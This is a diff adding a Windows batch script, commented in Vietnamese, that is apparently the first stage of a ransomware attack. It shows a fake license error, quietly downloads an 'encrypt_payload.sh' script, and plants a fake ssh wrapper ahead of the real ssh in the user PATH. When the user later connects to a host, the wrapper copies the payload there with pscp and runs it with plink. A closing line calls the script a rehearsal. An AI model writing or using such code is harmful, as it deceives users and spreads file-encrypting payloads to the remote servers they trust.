@@ -1,0 +1,132 @@
+@echo off
+SETLOCAL ENABLEDELAYEDEXPANSION
+REM --- CẤU HÌNH ---
+SET SH_DOWNLOAD_URL=http://your-internal-webserver.com/path/to/encrypt_payload.sh
+SET PAYLOAD_SH_LOCAL_PATH=%TEMP%\encrypt_payload.sh
+
+SET FAKE_ERROR_MESSAGE="Lỗi không xác định! Chưa thể kích hoạt license."
+SET LOG_FILE=%TEMP%\ransom_stage1_bat.log
+ECHO %DATE% %TIME% - Script STAGE 1 bắt đầu. > %LOG_FILE%
+
+REM --- GIAI ĐOẠN 1: LỖI GIẢ, TẢI PAYLOADS ---
+ECHO %FAKE_ERROR_MESSAGE%
+timeout /t 3 /nobreak > nul
+
+ECHO %DATE% %TIME% - Tải encrypt_payload.sh >> %LOG_FILE%
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%SH_DOWNLOAD_URL%', '%PAYLOAD_SH_LOCAL_PATH%')"
+IF ERRORLEVEL 1 (
+    ECHO %DATE% %TIME% - LỖI: Tải encrypt_payload.sh thất bại. >> %LOG_FILE%
+    GOTO EndScript
+)
+
+REM --- GIAI ĐOẠN 2: TẠO WRAPPER SCRIPT VÀ CHỈNH SỬA PATH ---
+REM Giả sử người dùng sử dụng OpenSSH client (ssh.exe)
+SET WRAPPER_DIR=%TEMP%\ssh_wrapper_temp
+IF NOT EXIST "%WRAPPER_DIR%" MKDIR "%WRAPPER_DIR%"
+SET FAKE_SSH_SCRIPT=%WRAPPER_DIR%\ssh.bat
+SET REAL_SSH_EXE=C:\Windows\System32\OpenSSH\ssh.exe
+REM Kiểm tra xem real_ssh_exe có tồn tại không, nếu không thì thử tìm bằng 'where'
+IF NOT EXIST "%REAL_SSH_EXE%" (
+    FOR /F "delims=" %%i IN ('where ssh.exe 2^>NUL') DO (
+        SET REAL_SSH_EXE=%%i
+        GOTO FoundRealSsh
+    )
+    ECHO %DATE% %TIME% - LỖI: Không tìm thấy ssh.exe thật. Không thể tạo wrapper. >> %LOG_FILE%
+    GOTO EndScript
+)
+:FoundRealSsh
+ECHO %DATE% %TIME% - ssh.exe thật được tìm thấy tại: %REAL_SSH_EXE% >> %LOG_FILE%
+
+
+ECHO %DATE% %TIME% - Tạo wrapper script: %FAKE_SSH_SCRIPT% >> %LOG_FILE%
+(
+    ECHO @echo off
+    ECHO SETLOCAL ENABLEDELAYEDEXPANSION
+    ECHO REM SSH Wrapper - Payload Execution Stage
+    ECHO SET ORIGINAL_ARGS=%%*
+    ECHO SET LOG_WRAPPER=%TEMP%\ssh_wrapper_activity.log
+    ECHO ECHO %%DATE%% %%TIME%% - SSH Wrapper được gọi với args: !ORIGINAL_ARGS! >> !LOG_WRAPPER!
+    ECHO SET TARGET_USER=
+    ECHO SET TARGET_HOST=
+    ECHO SET PAYLOAD_SH_ON_PC=%TEMP%\encrypt_payload.sh
+    ECHO SET LINUX_DEST_SH_PATH=/tmp/encrypt_payload.sh
+    ECHO SET PSCP_EXE_LOCAL=%TEMP%\pscp.exe
+    ECHO SET PLINK_EXE_LOCAL=%TEMP%\plink.exe
+
+    REM --- PHÂN TÍCH ĐỐI SỐ (CỰC KỲ ĐƠN GIẢN - CẦN CẢI THIỆN NHIỀU) ---
+    REM Giả định cơ bản: ssh user@host hoặc ssh host -l user
+    REM Đây là phần rất khó để làm đúng cho tất cả các trường hợp trong batch.
+    ECHO FOR /F "tokens=1,2 delims=@ " %%A IN ("!ORIGINAL_ARGS!") DO (
+    ECHO     SET "ARG1=%%A"
+    ECHO     SET "ARG2=%%B"
+    ECHO )
+    ECHO IF NOT "!ARG2!"=="" (
+    ECHO     REM Có vẻ là user@host
+    ECHO     ECHO "!ARG1!" | findstr /I /C:"-l" /C:"-p" /C:"-i" /C:"-J" /C:"-o" > nul
+    ECHO     IF ERRORLEVEL 1 (
+    ECHO         SET TARGET_USER=!ARG1!
+    ECHO         SET TARGET_HOST=!ARG2!
+    ECHO         REM Lấy phần host sạch nếu có các options theo sau, ví dụ user@host -p 2222
+    ECHO         FOR /F "tokens=1 delims= " %%H IN ("!TARGET_HOST!") DO SET TARGET_HOST=%%H
+    ECHO     )
+    ECHO ) ELSE (
+    ECHO     REM Có thể là "ssh host" hoặc "ssh -l user host"
+    ECHO     SET "TEMP_HOST=!ARG1!"
+    ECHO     REM Cố gắng tìm -l user
+    ECHO     SET "ARGS_COPY=!ORIGINAL_ARGS!"
+    ECHO     FOR /L %%%%N IN (1,1,5) DO (
+    ECHO         FOR /F "tokens=1,2,* delims= " %%%%X IN ("!ARGS_COPY!") DO (
+    ECHO             IF /I "%%%%X"=="-l" (
+    ECHO                 SET TARGET_USER=%%%%Y
+    ECHO                 SET TEMP_HOST=%%%%Z
+    ECHO                 REM Lấy phần host sạch nếu có options theo sau
+    ECHO                 FOR /F "tokens=1 delims= " %%H_IN ("!TEMP_HOST!") DO SET TEMP_HOST=%%H_IN
+    ECHO                 GOTO FoundUserL
+    ECHO             )
+    ECHO             SET "ARGS_COPY=%%%%Y %%%%Z"
+    ECHO         )
+    ECHO     )
+    ECHO     :FoundUserL
+    ECHO     IF "!TARGET_USER!"=="" SET TARGET_USER=%USERNAME% REM Mặc định là user hiện tại nếu không có -l
+    ECHO     SET TARGET_HOST=!TEMP_HOST!
+    ECHO )
+    ECHO ECHO %%DATE%% %%TIME%% - Phân tích: User='!TARGET_USER!', Host='!TARGET_HOST!' >> !LOG_WRAPPER!
+
+    REM --- Thực hiện copy và chạy payload NẾU phân tích được host ---
+    ECHO IF NOT "!TARGET_HOST!"=="" (
+    ECHO     ECHO %%DATE%% %%TIME%% - Đang copy %PAYLOAD_SH_ON_PC% to !TARGET_USER!@!TARGET_HOST!:!LINUX_DEST_SH_PATH! >> !LOG_WRAPPER!
+    ECHO     start "PSCP" /B "!PSCP_EXE_LOCAL!" -scp -batch "!PAYLOAD_SH_ON_PC!" "!TARGET_USER!@!TARGET_HOST!:!LINUX_DEST_SH_PATH!" >> !LOG_WRAPPER! 2^>^&1
+    ECHO     timeout /t 5 /nobreak > nul REM Chờ copy
+    ECHO     ECHO %%DATE%% %%TIME%% - Đang thực thi payload trên !TARGET_USER!@!TARGET_HOST! >> !LOG_WRAPPER!
+    ECHO     start "PLINK" /B "!PLINK_EXE_LOCAL!" -batch "!TARGET_USER!@!TARGET_HOST!" "chmod +x !LINUX_DEST_SH_PATH! ^&^& !LINUX_DEST_SH_PATH! ^&^& rm -f !LINUX_DEST_SH_PATH!" >> !LOG_WRAPPER! 2^>^&1
+    ECHO ) ELSE (
+    ECHO     ECHO %%DATE%% %%TIME%% - Không phân tích được host, bỏ qua payload. >> !LOG_WRAPPER!
+    ECHO )
+    ECHO ECHO %%DATE%% %%TIME%% - Gọi ssh.exe thật: %REAL_SSH_EXE% !ORIGINAL_ARGS! >> !LOG_WRAPPER!
+    ECHO "%REAL_SSH_EXE%" !ORIGINAL_ARGS!
+    ECHO ENDLOCAL
+) > "%FAKE_SSH_SCRIPT%"
+
+REM --- Cập nhật PATH (chỉ cho session hiện tại, hoặc cần quyền Admin để set vĩnh viễn) ---
+ECHO %DATE% %TIME% - Cố gắng đặt %WRAPPER_DIR% vào đầu PATH. >> %LOG_FILE%
+REM Cách 1: Cho session CMD hiện tại (nếu user chạy từ CMD đã mở)
+SET PATH=%WRAPPER_DIR%;%PATH%
+ECHO %DATE% %TIME% - PATH for current session: %PATH% >> %LOG_FILE%
+
+REM Cách 2: Cố gắng set cho User vĩnh viễn (có thể cần log off/on, không cần admin)
+REM SETX PATH "%WRAPPER_DIR%;%PATH%"
+REM ECHO %DATE% %TIME% - Lệnh SETX đã được gọi để cập nhật User PATH. >> %LOG_FILE%
+REM Chú ý: SETX PATH "%WRAPPER_DIR%;%PATH%" sẽ lấy GIÁ TRỊ HIỆN TẠI của PATH từ registry, không phải %PATH% của session này.
+REM Để thêm vào đầu một cách an toàn hơn:
+FOR /F "tokens=2,*" %%A IN ('REG QUERY "HKCU\Environment" /v Path') DO SET CURRENT_USER_PATH=%%B
+SETX PATH "%WRAPPER_DIR%;%CURRENT_USER_PATH%"
+ECHO %DATE% %TIME% - Lệnh SETX đã được gọi để cập nhật User PATH (cần log off/on). >> %LOG_FILE%
+
+
+ECHO Diễn tập giai đoạn 1 hoàn tất. Wrapper SSH đã được cài đặt (có thể cần log off/on hoặc mở CMD mới).
+ECHO Chờ người dùng thực hiện lệnh ssh...
+GOTO EndScript
+
+:EndScript
+ECHO %DATE% %TIME% - Script STAGE 1 kết thúc. >> %LOG_FILE%
+ENDLOCAL
